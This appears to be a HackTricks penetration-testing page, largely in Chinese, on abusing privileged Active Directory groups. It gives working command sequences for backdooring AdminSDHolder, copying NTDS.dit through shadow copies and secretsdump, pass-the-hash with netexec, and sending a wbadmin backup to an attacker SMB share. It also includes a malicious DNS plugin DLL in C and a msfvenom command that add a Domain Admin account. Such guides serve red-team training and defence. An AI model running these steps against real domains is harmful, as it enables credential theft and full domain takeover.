# 特权组

{{#include ../../banners/hacktricks-training.md}}

## 常见具有管理权限的组

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

该组有权在域中创建非管理员的账户和组。此外，它还允许在域控制器 (DC) 上进行本地登录。

要识别该组的成员，执行以下命令：
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
允许添加新用户，也允许在 DC 上进行本地登录。

## AdminSDHolder 组

**AdminSDHolder** 组的访问控制列表 (ACL) 非常关键，因为它为 Active Directory 中的所有“受保护组”（包括高权限组）设置权限。该机制通过阻止未授权的修改来确保这些组的安全。

攻击者可以通过修改 **AdminSDHolder** 组的 ACL，授予一个普通用户完整权限来利用这一点。这将使该用户有效地对所有受保护组拥有完全控制权。如果该用户的权限被更改或移除，由于系统设计，它将在一小时内被自动恢复。

用于查看成员和修改权限的命令包括：
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
有一个脚本可用于加速恢复过程： [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

更多细节，请参见 [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

该组的成员可读取已删除的 Active Directory 对象，这可能暴露敏感信息：
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### 域控制器访问

对 DC 上的文件访问受到限制，除非用户属于 `Server Operators` 组，该组会改变访问级别。

### 权限提升

使用 Sysinternals 的 `PsService` 或 `sc`，可以检查并修改服务权限。例如，`Server Operators` 组对某些服务拥有完全控制权，允许执行任意命令并进行权限提升：
```cmd
C:\> .\PsService.exe security AppReadiness
```
此命令显示 `Server Operators` 拥有完全访问权限，可以操作服务以获取提升的权限。

## Backup Operators

加入 `Backup Operators` 组可通过 `SeBackup` 和 `SeRestore` 特权访问 `DC01` 的文件系统。使用 `FILE_FLAG_BACKUP_SEMANTICS` 标志，这些特权允许遍历文件夹、列出内容并复制文件，即使没有显式权限。此过程需要使用特定的脚本。

要列出组成员，执行：
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### 本地攻击

要在本地利用这些权限，执行以下步骤：

1. 导入必要的库：
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. 启用并验证 `SeBackupPrivilege`：
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. 访问并复制受限目录中的文件，例如：
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD 攻击

直接访问域控制器的文件系统可窃取包含域用户和计算机所有 NTLM 哈希的 `NTDS.dit` 数据库。

#### 使用 diskshadow.exe

1. 创建 `C` 驱动器的影子副本：
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. 从影子副本复制 `NTDS.dit`：
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
或者，使用 `robocopy` 进行文件复制:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. 提取 `SYSTEM` 和 `SAM` 以获取哈希：
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. 检索来自 `NTDS.dit` 的所有 hashes：
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. 提取后: Pass-the-Hash 到 DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### 使用 wbadmin.exe

1. 在攻击者机器上为 SMB 服务器设置 NTFS 文件系统，并在目标机器上缓存 SMB 凭证。
2. 使用 `wbadmin.exe` 进行系统备份并提取 `NTDS.dit`：
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Members of the **DnsAdmins** group can exploit their privileges to load an arbitrary DLL with SYSTEM privileges on a DNS server, often hosted on Domain Controllers. This capability allows for significant exploitation potential.

要列出 DnsAdmins 组的成员，使用：
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### 执行任意 DLL (CVE‑2021‑40469)

> [!NOTE]
> 此漏洞允许在 DNS 服务中以 SYSTEM 权限执行任意代码（通常在 DCs 内）。该问题已在 2021 年修复。

Members 可以使 DNS 服务器加载任意 DLL（本地或来自远程共享），使用如下命令：
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
需要重启 DNS 服务 (可能需要额外权限)，以便加载该 DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
有关此攻击向量的更多详细信息，请参考 ired.team。

#### Mimilib.dll

也可以使用 mimilib.dll 进行命令执行，通过修改它来执行特定命令或 reverse shells。[Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) 获取更多信息。

### WPAD Record for MitM

DnsAdmins 可以操作 DNS 记录，通过在禁用全局查询阻止列表后创建 WPAD 记录来执行 Man-in-the-Middle (MitM) 攻击。像 Responder 或 Inveigh 这样的工具可以用于欺骗并捕获网络流量。

### Event Log Readers
成员可以访问事件日志，可能会发现敏感信息，例如明文密码或命令执行的详细信息：
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Permissions

该组可以修改域对象上的 DACLs，可能会授予 DCSync 权限。有关利用该组进行权限提升的技术详见 Exchange-AD-Privesc GitHub repo。
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators 拥有对 Hyper-V 的完全访问权限，可被滥用以控制虚拟化的域控制器。 这包括克隆运行中的 DC 并从 NTDS.dit 文件中提取 NTLM 哈希。

### Exploitation Example

Firefox 的 Mozilla Maintenance Service 可被 Hyper-V Administrators 利用，以 SYSTEM 身份执行命令。此方法涉及创建指向受保护 SYSTEM 文件的硬链接并将其替换为恶意可执行文件：
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
注意：最近的 Windows 更新已缓解 Hard link exploitation。

## Group Policy Creators Owners

该组允许成员在域中创建 Group Policies。但其成员不能将 group policies 应用到用户或组，也不能编辑现有的 GPOs。

## Organization Management

在部署了 **Microsoft Exchange** 的环境中，一个名为 **Organization Management** 的特殊组拥有重要能力。该组有特权 **访问所有域用户的邮箱**，并对 **'Microsoft Exchange Security Groups' 组织单位 (OU) 拥有完全控制权**。此控制包括 **`Exchange Windows Permissions`** 组，可被利用进行权限提升。

### 权限利用与命令

#### Print Operators

**Print Operators** 组的成员拥有若干权限，包括 **`SeLoadDriverPrivilege`**，这使得他们可以 **在 Domain Controller 上本地登录**、关闭它并管理打印机。要利用这些权限，尤其是在非提升上下文中看不到 **`SeLoadDriverPrivilege`** 时，需要绕过 User Account Control (UAC)。

要列出该组的成员，可使用以下 PowerShell 命令：
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
有关与 **`SeLoadDriverPrivilege`** 相关的更详细利用技术，请查阅专门的安全资料。

#### 远程桌面用户

该组的成员通过 Remote Desktop Protocol (RDP) 获得对 PC 的访问权限。要枚举这些成员，可以使用 PowerShell 命令：
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
有关利用 RDP 的更多见解可以在专门的 pentesting 资源中找到。

#### 远程管理用户

成员可以通过 **Windows Remote Management (WinRM)** 访问 PC。  
这些成员的枚举可通过下列方式完成：
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
有关与 **WinRM** 相关的利用技术，请参考相应的文档。

#### Server Operators

该组具有对 Domain Controllers 执行各种配置的权限，包括备份和恢复权限、更改系统时间以及关闭系统。要枚举成员，提供的命令是：
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## 参考资料 <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
